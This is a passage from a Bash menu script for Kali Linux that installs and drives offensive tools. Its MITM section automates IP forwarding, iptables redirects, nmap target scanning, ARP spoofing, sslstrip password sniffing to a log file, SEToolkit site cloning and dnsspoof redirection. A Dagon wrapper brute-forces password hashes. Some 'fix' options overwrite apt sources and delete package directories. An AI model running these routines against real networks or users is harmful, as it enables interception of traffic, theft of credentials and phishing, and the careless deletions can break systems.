		if [[ "$HOWMANYSELECTED" == 0 ]]
		then
			echo -e ""$RS"No tools selected"$CE""
			sleep 2
			continue
		fi
		j=1
		while [[ "$j" -le "$HOWMANYSELECTED" ]]
		do
			clear
			echo -e ""$YS"Installing "${toolselected["$j"]}""$CE"("$YS"$j"$CE"/"$YS"$HOWMANYSELECTED"$CE")"
			sleep 1
			command="install_"${toolselected["$j"]}""
			$command
			j=$((j+1))
		done
		p=0
		while [[ "$p" -le "$TOOLSNUM" ]]
		do
			selected["$p"]=0
			p=$((p+1))
		done
		NOCONFIRM=0
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$ST" == "n" ]]
	then
		if [[ "$NOCONFIRM" != 1 ]]
		then
			NOCONFIRM=1
		else
			NOCONFIRM=0
		fi
	elif [[ ! "$ST" -ge 1 ]]
	then
		continue
	else
		STF=$((ST-1))
		if [[ "${selected["$STF"]}" == 1 ]]
		then
			selected["$STF"]=0
		else
			selected["$STF"]=1
		fi
	fi
done
#~ while true
#~ do
	#~ cd
	#~ clear
	#~ TERMINALTITLE="INSTALL/REINSTALL A TOOL"
	#~ dash_calc
	#~ printf '\033]2;INSTALL/REINSTALL A TOOL\a'
	#~ echo -e ""$BS"Select a tool to install/reinstall"$CE""
	#~ echo -e " "$YS"1"$CE") Fluxion      "$YS"21"$CE") 4nonimizer    "$YS"41"$CE") Infoga           "$YS"61"$CE") Wifi-Pumpkin"
	#~ echo -e ""$YS" 2"$CE") Wifite       "$YS"22"$CE") Openvas       "$YS"42"$CE") nWatch           "$YS"62"$CE") Veil-Framework"
	#~ echo -e ""$YS" 3"$CE") Wifiphisher  "$YS"23"$CE") BeeLogger     "$YS"43"$CE") Eternal scanner  "$YS"63"$CE") Leviathan"
	#~ echo -e ""$YS" 4"$CE") Zatacker     "$YS"24"$CE") Ezsploit      "$YS"44"$CE") Eaphammer        "$YS"64"$CE") FakeImageExploiter"
	#~ echo -e ""$YS" 5"$CE") Morpheus     "$YS"25"$CE") Pupy          "$YS"45"$CE") Dagon            "$YS"65"$CE") Avet"
	#~ echo -e ""$YS" 6"$CE") Osrfconsole  "$YS"26"$CE") Zirikatu      "$YS"46"$CE") Lalin            "$YS"66"$CE") Gloom"
	#~ echo -e ""$YS" 7"$CE") Hakku        "$YS"27"$CE") WiFi-autopwner"$YS"47"$CE") Knockmail        "$YS"67"$CE") Arcanus"
	#~ echo -e ""$YS" 8"$CE") Trity        "$YS"28"$CE") Bully         "$YS"48"$CE") Kwetza           "$YS"68"$CE") MSFPC"
	#~ echo -e ""$YS" 9"$CE") Cupp         "$YS"29"$CE") Anonsurf      "$YS"49"$CE") Ngrok            "$YS"69"$CE") MorphHTA"
	#~ echo -e ""$YS"10"$CE") Dracnmap     "$YS"30"$CE") Anonym8       "$YS"50"$CE") Bleachbit        "$YS"70"$CE") LFISuite"
	#~ echo -e ""$YS"11"$CE") Fern         "$YS"31"$CE") TheFatRat     "$YS"51"$CE") Vmr mdk          "$YS"71"$CE") UniByAv"
	#~ echo -e ""$YS"12"$CE") Netdiscover  "$YS"32"$CE") Angry IP      "$YS"52"$CE") Hash Buster      "$YS"72"$CE") Demiguise"
	#~ echo -e ""$YS"13"$CE") KickThemOut  "$YS"33"$CE") Sniper        "$YS"53"$CE") Findsploit       "$YS"73"$CE") Dkmc"
	#~ echo -e ""$YS"14"$CE") Ghost-Phisher"$YS"34"$CE") ReconDog      "$YS"54"$CE") Howdoi           "$YS"74"$CE") MITMf"
	#~ echo -e ""$YS"15"$CE") The Eye      "$YS"35"$CE") RED HAWK      "$YS"55"$CE") Operative-frmwork"$YS"75"$CE") Netool-toolkit"
	#~ echo -e ""$YS"16"$CE") Xerxes       "$YS"36"$CE") WinPayloads   "$YS"56"$CE") Netattack2       "$YS"76"$CE") Patator"
	#~ echo -e ""$YS"17"$CE") Mdk3-master  "$YS"37"$CE") Shellter      "$YS"57"$CE") Koadic           "$YS"77"$CE") Evil-Droid"
	#~ echo -e ""$YS"18"$CE") Katana       "$YS"38"$CE") CHAOS         "$YS"58"$CE") Empire           "$YS"78"$CE") NoSQLMap"
	#~ echo -e ""$YS"19"$CE") Airgeddon    "$YS"39"$CE") Routersploit  "$YS"59"$CE") Meterpr.-Paranoid"
	#~ echo -e ""$YS"20"$CE") Websploit    "$YS"40"$CE") Geany         "$YS"60"$CE") Dr0p1t"
	#~ echo -e ""$YS" b"$CE") Go back"
	#~ echo -e ""$YS" 0"$CE") Exit"
	#~ echo -e "Choose: "
	#~ read REIN
	#~ clear
	#~ if [[ "$REIN" = "1" ]]
	#~ then
		#~ install_fluxion		
	#~ elif [[ "$REIN" = "2" ]]
	#~ then
		#~ install_wifite
	#~ elif [[ "$REIN" = "3" ]]
	#~ then
		#~ install_wifiphisher
	#~ elif [[ "$REIN" = "4" ]]
	#~ then
		#~ install_zatacker
	#~ elif [[ "$REIN" = "5" ]]
	#~ then
		#~ install_morpheus
	#~ elif [[ "$REIN" = "6" ]]
	#~ then
		#~ install_osrframework			
	#~ elif [[ "$REIN" = "7" ]]
	#~ then
		#~ install_hakku
	#~ elif [[ "$REIN" = "8" ]]
	#~ then
		#~ install_trity
	#~ elif [[ "$REIN" = "9" ]]
	#~ then
		#~ install_cupp
	#~ elif [[ "$REIN" = "10" ]]
	#~ then
		#~ install_dracnmap
	#~ elif [[ "$REIN" = "11" ]]
	#~ then
		#~ install_fern
	#~ elif [[ "$REIN" = "12" ]]
	#~ then
		#~ install_netdiscover		
	#~ elif [[ "$REIN" = "13" ]]
	#~ then
		#~ install_kickthemout
	#~ elif [[ "$REIN" = "14" ]]
	#~ then
		#~ install_ghostphisher
	#~ elif [[ "$REIN" = "15" ]]
	#~ then
		#~ install_theeye
	#~ elif [[ "$REIN" = "16" ]]
	#~ then
		#~ install_xerxes
	#~ elif [[ "$REIN" = "17" ]]
	#~ then
		#~ install_mdk3
	#~ elif [[ "$REIN" = "18" ]]
	#~ then
		#~ install_katana
	#~ elif [[ "$REIN" = "19" ]]
	#~ then
		#~ install_airgeddon
	#~ elif [[ "$REIN" = "20" ]]
	#~ then
		#~ install_websploit
	#~ elif [[ "$REIN" = "21" ]]
	#~ then
		#~ install_4nonimizer
	#~ elif [[ "$REIN" = "22" ]]
	#~ then
		#~ install_openvas
	#~ elif [[ "$REIN" = "23" ]]
	#~ then
		#~ install_beelogger
	#~ elif [[ "$REIN" = "24" ]]
	#~ then
		#~ install_ezsploit
	#~ elif [[ "$REIN" = "25" ]]
	#~ then
		#~ install_pupy
	#~ elif [[ "$REIN" = "26" ]]
	#~ then
		#~ install_zirikatu
	#~ elif [[ "$REIN" = "27" ]]
	#~ then
		#~ install_wifiautopwner
	#~ elif [[ "$REIN" = "28" ]]
	#~ then
		#~ install_bully
	#~ elif [[ "$REIN" = "29" ]]
	#~ then
		#~ install_anonsurf
	#~ elif [[ "$REIN" = "30" ]]
	#~ then
		#~ install_anonym8
	#~ elif [[ "$REIN" = "31" ]]
	#~ then	
		#~ install_thefatrat
	#~ elif [[ "$REIN" = "32" ]]
	#~ then
		#~ install_angryip
	#~ elif [[ "$REIN" = "33" ]]
	#~ then
		#~ install_sniper
	#~ elif [[ "$REIN" = "34" ]]
	#~ then
		#~ install_recondog
	#~ elif [[ "$REIN" = "35" ]]
	#~ then
		#~ install_redhawk
	#~ elif [[ "$REIN" = "36" ]]
	#~ then
		#~ install_winpayloads
	#~ elif [[ "$REIN" = "37" ]]
	#~ then
		#~ install_shellter
	#~ elif [[ "$REIN" = "38" ]]
	#~ then
		#~ install_chaos
	#~ elif [[ "$REIN" = "39" ]]
	#~ then
		#~ install_routersploit
	#~ elif [[ "$REIN" = "40" ]]
	#~ then
		#~ install_geany
	#~ elif [[ "$REIN" = "41" ]]
	#~ then
		#~ install_infoga
	#~ elif [[ "$REIN" = "42" ]]
	#~ then
		#~ install_nwatch
	#~ elif [[ "$REIN" = "43" ]]
	#~ then
		#~ install_eternalscanner
	#~ elif [[ "$REIN" = "44" ]]
	#~ then
		#~ install_eaphammer
	#~ elif [[ "$REIN" = "45" ]]
	#~ then
		#~ install_dagon
	#~ elif [[ "$REIN" = "46" ]]
	#~ then
		#~ install_lalin
	#~ elif [[ "$REIN" = "47" ]]
	#~ then
		#~ install_knockmail
	#~ elif [[ "$REIN" = "48" ]]
	#~ then
		#~ install_kwetza
	#~ elif [[ "$REIN" = "49" ]]
	#~ then
		#~ install_ngrok
	#~ elif [[ "$REIN" = "50" ]]
	#~ then
		#~ install_bleachbit
	#~ elif [[ "$REIN" = "51" ]]
	#~ then
		#~ install_vmr
	#~ elif [[ "$REIN" = "52" ]]
	#~ then
		#~ install_hashbuster
	#~ elif [[ "$REIN" = "53" ]]
	#~ then
		#~ install_findsploit
	#~ elif [[ "$REIN" = "54" ]]
	#~ then
		#~ install_howdoi
	#~ elif [[ "$REIN" = "55" ]]
	#~ then
		#~ install_operative
	#~ elif [[ "$REIN" = "56" ]]
	#~ then
		#~ install_netattack2
	#~ elif [[ "$REIN" = "57" ]]
	#~ then
		#~ install_koadic
	#~ elif [[ "$REIN" = "58" ]]
	#~ then
		#~ install_empire
	#~ elif [[ "$REIN" = "59" ]]
	#~ then
		#~ install_meterpreter_paranoid_mode
	#~ elif [[ "$REIN" = "60" ]]
	#~ then
		#~ install_dropit_frmw
	#~ elif [[ "$REIN" = "61" ]]
	#~ then
		#~ install_wifi_pumpkin
	#~ elif [[ "$REIN" = "62" ]]
	#~ then
		#~ install_veil
	#~ elif [[ "$REIN" = "63" ]]
	#~ then
		#~ install_leviathan
	#~ elif [[ "$REIN" = "64" ]]
	#~ then
		#~ install_fake_image
	#~ elif [[ "$REIN" = "65" ]]
	#~ then
		#~ install_avet
	#~ elif [[ "$REIN" = "66" ]]
	#~ then
		#~ install_gloom
	#~ elif [[ "$REIN" = "67" ]]
	#~ then
		#~ install_arcanus
	#~ elif [[ "$REIN" = "68" ]]
	#~ then
		#~ install_msfpc
	#~ elif [[ "$REIN" = "69" ]]
	#~ then
		#~ install_morphhta
	#~ elif [[ "$REIN" = "70" ]]
	#~ then
		#~ install_lfi
	#~ elif [[ "$REIN" = "71" ]]
	#~ then
		#~ install_unibyav
	#~ elif [[ "$REIN" = "72" ]]
	#~ then
		#~ install_demiguise
	#~ elif [[ "$REIN" = "73" ]]
	#~ then
		#~ install_dkmc
	#~ elif [[ "$REIN" = "74" ]]
	#~ then
		#~ install_mitmf
	#~ elif [[ "$REIN" = "75" ]]
	#~ then
		#~ install_netool
	#~ elif [[ "$REIN" = "76" ]]
	#~ then
		#~ install_patator
	#~ elif [[ "$REIN" = "77" ]]
	#~ then
		#~ install_evil_droid
	#~ elif [[ "$REIN" = "78" ]]
	#~ then
		#~ install_nosqlmap
	#~ elif [[ "$REIN" = "back" || "$REIN" = "b" ]]
	#~ then
		#~ clear
		#~ break
	#~ elif [[ "$REIN" = "00" ]]
	#~ then	
		#~ exec bash "$0"
	#~ elif [[ "$REIN" = "0" ]]
	#~ then
		#~ clear
		#~ exit
	#~ fi
	#~ done
}
function errors_menu
{
while true
do
clear
TERMINALTITLE="ERRORS"
dash_calc
printf '\033]2;ERRORS\a'
echo -e ""$YS" 1"$CE") Fix no audio issue"
echo -e ""$YS" 2"$CE") No output in wash"
echo -e ""$YS" 3"$CE") No full screen"
echo -e ""$YS" 4"$CE") Error constructing proxy for org.gnome.Terminal"
echo -e ""$YS" 5"$CE") Error starting apache2 service"
echo -e ""$YS" 6"$CE") Errors when apt-get update"
echo -e ""$YS" 7"$CE") Errors when creating a payload with Winpayloads"
echo -e ""$YS" 8"$CE") Complete fix for apache2 service failed to start"
echo -e ""$YS" 9"$CE") Cannot capture handshake-pyrit verification always bad"
echo -e ""$YS" b"$CE") Go back"
echo -e ""$YS" 0"$CE") EXIT"
echo -e " Choose: "
read ERRS
clear
if [[ "$ERRS" = "1" ]]
then
	clear
	echo -e "Trying to get you some audio..."
	sleep 2
	clear
	echo -e "Press "$YS"y"$CE" if/when prompted"
	sleep 3
	clear
	echo -e "Installing pulseaudio......."
	sleep 1
	apt-get pulseaudio
	echo -e "Enabling pulseaudio......."
	sleep 1
	systemctl --user enable pulseaudio && systemctl --user start pulseaudio
	clear
	echo -e "Done!"
	sleep 1
	clear
	echo -e "I mean...Try to see if you have audio."
	sleep 3
	echo -e " "
	echo -e "That's all i can do :/"
	sleep 2
	echo -e " "
	echo -e "If it wasn't fix , then try rebooting"
elif [[ "$ERRS" = "2" ]]
then
	clear
	echo -e "Ok...Lets try to fix this..."
	sleep 1
	mkdir /etc/reaver
	echo -e "It seems to be fixed."
	echo -e "Enter you interface"
	read INTWASH
	echo -e "Press "$YS"many key"$CE" to test wash"
	echo -e "Also try "wash -i wlan0mon -a" to display all networks"
	wash -i $INTWASH
elif [[ "$ERRS" = "3" ]]
then
	apt-get install -y open-vm-tools-desktop fuse
	echo -e "Restart your vistual machine..."
	sleep 2
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "4" ]]
then
	locale-gen
	localectl set-locale LANG="en_US.UTF-8"
	sleep 2
	echo -e "Reboot your system now"
	sleep 3
elif [[ "$ERRS" = "5" ]]
then
	service nginx stop
	echo -e "I think i fixed it. Try again: service apache2 start "
	sleep 5
elif [[ "$ERRS" = "6" ]]
then
	echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
	rm -r -f /etc/apt/sources.list.d/*
	echo -e "Try   apt-get update    again. That's all i can do."
	sleep 3
elif [[ "$ERRS" = "7" ]]
then
	rm -f -r /usr/local/lib/python2.7/dist-packages/Crypto
	echo -e "Error was fixed!"
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "8" ]]
then
	apt-get -y remove nginx
	apt-get -y remove nginx-full
	apt-get -y remove nginx-common
	apt-get -y autoremove
	clear
	echo -e "Error was fixed!"
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "9" ]]
then
	wget -O /tmp/scapy2.3.2.tar.gz https://pypi.python.org/packages/6d/72/c055abd32bcd4ee6b36ef8e9ceccc2e242dea9b6c58fdcf2e8fd005f7650/scapy-2.3.2.tar.gz; sudo pip2 install /tmp/scapy2.3.2.tar.gz
	clear
	echo -e "Error was fixed!"
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "back" || "$ERRS" = "b" || "$ERRS" = 00 ]]
then
	BACKL="1"
	break
elif [[ "$ERRS" = "0" ]]
then
	clear
	exit
else
	clear
	echo -e "Not a valid option...."
	sleep 2
fi
done
}
function keyboard_shortcuts
{
if [[ ! -d ""$KSPATH"" ]]
then
	mkdir "$KSPATH"
fi
while true
do
TERMINALTITLE="KEYBOARD SHORTCUTS"
dash_calc
printf '\033]2;KEYBOARD SHORTCUTS\a'
echo -e ""$YS" 1"$CE") Tools"
echo -e ""$YS" 2"$CE") See hidden shortcuts"
echo -e ""$YS" b"$CE") Go back"
#~ echo -e ""$YS"00"$CE") Main menu"
echo -e ""$YS" 0"$CE") EXIT"
read KS
clear
if [[ "$KS" = "1" ]]
then
	while true
	do
		echo -e "Available shortcuts:                        "$YS"reset"$CE") Delete all shortcuts"
		nn=1
		#start sorting out all the available shortcuts
		HOWADD=$(( HOWMANYTOOLS + 1 )) 
		while [ "$nn" != "$HOWADD" ]
		do
		listshortcuts
		#adding a space where needed on the output,so it will be sorted correctly
		if [[ "$nn" -lt "10" ]]
		then
			n=" $nn"
		else
			n="$nn"
		fi
		if [[ ! -f ""$KSPATH"/"$TITLE"/"$TITLE".txt" ]]
		then
			echo -e ""$YS""$n""$CE") "$TITLE""
		else
			read KSKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [[ "$KSKS" = "" ]]
			then
				KSKS="ERROR(fix=recreate the shortcut)"
			else
				read currentks < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
				size=${#TITLE}
				calc=$(( 35-size ))
				numcalc=1
				SPACES=""
				while [ $numcalc != $calc ]
				do
					SPACES=""$SPACES"_"
					numcalc=$(( numcalc+1 ))
				done
				#~ read SPACES < "$KSPATH"/spaces.txt
				echo -e ""$YS""$n""$CE") "$TITLE""$SPACES""$KSKS""
			fi
		fi
		nn=$(( nn+1 ))
		done
		echo -e ""$YS" b"$CE") Go back"
		#echo -e ""$YS" 0"$CE") EXIT"
		echo -e "Choose: "
		#nn=""
		read nn
		clear
		listshortcuts
		if [[ "$nn" = "" ]]
		then
			continue
		fi
		if [[ "$nn" = "back" || "$nn" = "b" ]]
		then
			clear
			break
		elif [[ "$nn" = "0" ]]
		then
			clear
			exit
		elif [[ "$nn" = "00" ]]
		then
			exec bash "$0"
		elif [[ "$nn" = "reset" ]]
		then
			rm -r "$KSPATH"/*
		elif [[ "$nn" -le "$HOWMANYTOOLS" ]]
		then
			createshortcut
		fi
		done
	elif [[ "$KS" = "2" ]]
	then
		hidden_shortcuts
	elif [[ "$KS" = "back" || "$KS" = "b" ]]
	then
		BACKL="1"
		clear
		break
	elif [[ "$KS" = "0" ]]
	then
		clear
		exit
	elif [[ "$KS" = "00" ]]
	then
		exec bash "$0"
	fi
done
}
function mitm_menu
{
clear
TERMINALTITLE="MITM"
dash_calc
printf '\033]2;MITM\a'
echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
echo -e ""$YS" b"$CE") Go back"
echo -e ""$YS" 0"$CE") EXIT"
read MITMATT
clear
if [[ "$MITMATT" = "1" ]]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward "
	echo -e ""$YS" 2"$CE") Set iptables"
	echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
	echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e MITMCH
	if [[ "$MITMCH" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "2" ]]
	then
		clear
		echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
		read PORTTCP
		if [[ "$PORTTCP" = "" ]]
		then
			PORTTCP="8080"
		fi
					clear
		echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
		read PORTUDP
		if [[ "$PORTUDP" = "" ]]
		then
			PORTUDP="40"
		fi
		iptables --flush
		iptables --flush -t nat
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "3" ]]
	then
		clear
		route -n
		echo -e ""
		echo -e ""
		echo -e "Enter your gateway(prefer "$ETH" gateway):"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface("$YS"Enter"$CE"="$ETH"):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="$ETH"
		fi	
		while true
		do	
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Enter your target IP:"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "33" ]]
	then
		clear
		echo -e "Enter your gateway(prefer "$ETH" gateway):"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface("$YS"Enter"$CE"="$ETH"):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="$ETH"
		fi
		clear
		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
		read TARGIP
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "4" ]]
	then
		leafpad /root/sslstrip.log
	#~ elif [[ "$MITMCH" = "44" ]]
	#~ then
	elif [[ "$MITMCH" = "back" || "$MITMCH" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMCH" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMCH" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "2" ]]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward"
	echo -e ""$YS" 2"$CE") Scan and select target IP         "$YS"22"$CE") I have scaned"
	echo -e ""$YS" 3"$CE") Start ARPspoofing"
	#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
	echo -e ""$YS" 4"$CE") Start SEToolkit"
	echo -e ""$YS" 5"$CE") Start DNSspoofing"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e MITMSET
	clear
	if [[ "$MITMSET" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMSET" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMSET" = "2" ]]
	then
		route -n
		echo -e ""
		echo -e ""
		echo -e "Enter your gateway:"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(e.g: wlan0):"
		read GATEINT
		while true
		do		
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
	elif [[ "$MITMSET" = "22" ]]
	then
		echo -e "Enter your gateway:"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(e.g: wlan0):"
		read GATEINT
		clear
		echo -e "Enter your target IP:"
		read TARGIP
	elif [[ "$MITMSET" = "3" ]]
	then
		export PAKTC
		export GATEINT
		export TARGIP
		export GATENM
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
	#~ elif [[ "$MITMSET" = "4" ]]
	#~ then
		#~ service apache2 start
	#~ elif [[ "$MITMSET" = "d4" ]]
	#~ then
		#~ service apache2 stop
	elif [[ "$MITMSET" = "4" ]]
	then
		echo -e "Clone a website to one of the following IP(s):"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		echo -e "$PAKTC"
		$READAK
		gnome-terminal --geometry 66x40+999999+0 -e setoolkit
	elif [[ "$MITMSET" = "5" ]]
	then
		echo -e "Making you a hosts.txt file"
		echo -e ""
		echo -e "Enter your IP address that you started the server:"
		echo -e "One of this/these:"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		read -e SERVIP
		echo -e "Enter the interface of that IP(e.g: wlan0):"
		read -e INTIP
		if [[ -f ""$LPATH"/HOSTS/hosts.txt" ]]
		then
			rm "$LPATH"/HOSTS/hosts.txt
		fi
		mkdir "$LPATH"/HOSTS
		clear
		while true
		do
		clear
		echo -e "Enter the URL you want to redirect your IP from(e.g: thisis.myfakesite.com):"
		read -e URL
		echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
		sleep 0.2
		clear
		echo -e "Add another one as well?"$YNYES""
		read -e ANOTHERHOST
		if [[ "$ANOTHERHOST" = "n" ]]
		then
			break
		fi
		done
		clear
		echo -e "Starting dnsspoof..."
		echo -e "$PAKTC"
		$READAK
		export INTIP
		xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
	elif [[ "$MITMSET" = "back" || "$MITMSET" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMSET" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMSET" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "back" || "$MITMATT" = "b" ]]
then
	BACKL="1"
	break
elif [[ "$MITMATT" = "00" ]]
then			
	clear
	exec bash "$0"
elif [[ "$MITMATT" = "0" ]]
then
	clear
	exit
fi
}
function dagon_script
{
while true
do
	clear
	TERMINALTITLE="DAGON"
	dash_calc
	printf '\033]2;DAGON\a'
	if [[ "$HASH" = "" || "$HASH" = "\e[1;31mNONE\e[0m" ]]
	then
		HASH="\e[1;31mNONE\e[0m"
		OK=0
	fi
	if [[ "$CORV" = "" ]]
	then
		CORV="crack"
	fi
	echo -e "-----------------Basic options-----------------"
	echo -e ""$YS" 1"$CE") Specify your hash(es)        CURRENT:$HASH"
	echo -e ""$YS" 2"$CE") Crack/verify                 CURRENT:$CORV"
	if [[ -f /root/lscript/hashlog.txt ]]
	then
		echo -e ""$YS" 3"$CE") View your last log"
	else
		echo -e ""$RS" 3"$CE") View your last log"
	fi
	echo -e "--------------------Optional--------------------"
	if [[ "$DICTATTACK" = "" ]]
	then
		DICTATTACK="OFF"
	fi
	echo -e ""$YS" 4"$CE") Dictionary attack            CURRENT:$DICTATTACK"
	if [[ "$DICT" = "" && $DICTATTACK = "OFF" ]]
	then
		DICT="OFF"
	elif [[ "$DICT" = "\e[1;31mNONE\e[0m" && $DICTATTACK = "OFF" ]]
	then
		DICT="OFF"
	elif [[ "$DICT" = "OFF" && $DICTATTACK = "ON" ]]
	then
		DICT="\e[1;31mNONE\e[0m"
	elif [[ "$DICT" = "" && $DICTATTACK = "ON" ]]
	then
		DICT="\e[1;31mNONE\e[0m"
	fi
	if [[ "$DICTTYPE" = 1 ]]
	then
		DICT="$DICTPATH"
	elif [[ "$DICTTYPE" = 2 ]]
	then
		DICT="multiple"
	elif [[ "$DICTTYPE" = 3 ]]
	then
		DICT="$DICTPATH folder"
	fi
	echo -e "   "$YS"5"$CE") Specify dictionary/ies     CURRENT:$DICT"
	echo -e "------------------------------------------------"
	echo -e ""$YS" b"$CE") Go back              "$YS"update"$CE") Update dagon"
	echo -e ""$YS"start"$CE") Start"
	echo -e "Choose: "
	read DAGON
	clear
	if [[ "$DAGON" = "back" || "$DAGON" = "b" ]]
	then
		break
	elif [[ "$DAGON" = "4" ]]
	then
		if [[ "$DICTATTACK" = "OFF" ]]
		then
			DICTATTACK="ON"
		else
			DICTATTACK="OFF"
		fi
	elif [[ "$DAGON" = "update" ]]
	then
		cd /root/dagon
		python dagon.py --update
		sleep 3
	elif [[ "$DAGON" = "start" ]]
	then
		if [[ "$HASH" = "" || "$HASH" = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"No hash selected."$CE""
			sleep 3
		fi
		if [[ "$DICTATTACK" = "ON" && $DICT = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"No dictionary selected, but dictionary option is enabled"$CE""
			sleep 5
			continue
		fi
		cd /root/dagon
		if [[ "$HASHTYPE" = 1 ]]
		then
			if [[ "$CORV" = "crack" ]]
			then
				HASHCOMMAND="python dagon.py -c "$HASH" --bruteforce"
			else
				HASHCOMMAND="python dagon.py -v "$HASH""
			fi
		elif [[ "$HASHTYPE" = 2 || "$HASHTYPE" = 3 ]]
		then
			if [[ "$CORV" = "crack" ]]
			then
				HASHCOMMAND="python dagon.py -l "$HASH" --bruteforce"
			else
				HASHCOMMAND="python dagon.py -V "$HASH""
			fi
		fi
		if [[ "$DICTATTACK" = "ON" ]]
		then
			if [[ "$DICTTYPE" = 1 ]]
			then
				DICTCOMMAND="-w $DICTPATH"
			elif [[ "$DICTTYPE" = 2 ]]
			then
				DICTCOMMAND="-W $DICTPATH"
			elif [[ "$DICTTYPE" = 3 ]]
			then
				DICTCOMMAND="-D $DICTPATH"	
			fi
		else
			DICTCOMMAND=""
		fi	
		
	$HASHCOMMAND $DICTCOMMAND | tee "$LPATH/hashlog.txt"
	echo -e "$PAKTGB"
	$READAK
	elif [[ "$DAGON" = 5 ]]
	then
		echo -e ""$YS" 1"$CE") Select one disctionary"
		echo -e ""$YS" 2"$CE") Select multiple disctionaries"
		echo -e ""$YS" 3"$CE") Select a folder with disctionaries"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read DICTSEL
		clear
		if [[ "$DICTSEL" = 1 ]]
		then
			echo -e "Type the path of the dictionary:"
			read DICTPATH
			if [[ ! -f "$DICTPATH" ]]
			then
				echo -e ""$RS"No such file"$CE""
				sleep 2
				continue
			fi
			DICTTYPE=1
		elif [[ "$DICTSEL" = 2 ]]
		then
			echo -e "Type the path of the first dictionary:"
			read DICTPATH
			if [[ ! -f "$DICTPATH" ]]
			then
				echo -e ""$RS"No such file"$CE""
				sleep 2
				continue
			fi
			while true
			do
				clear
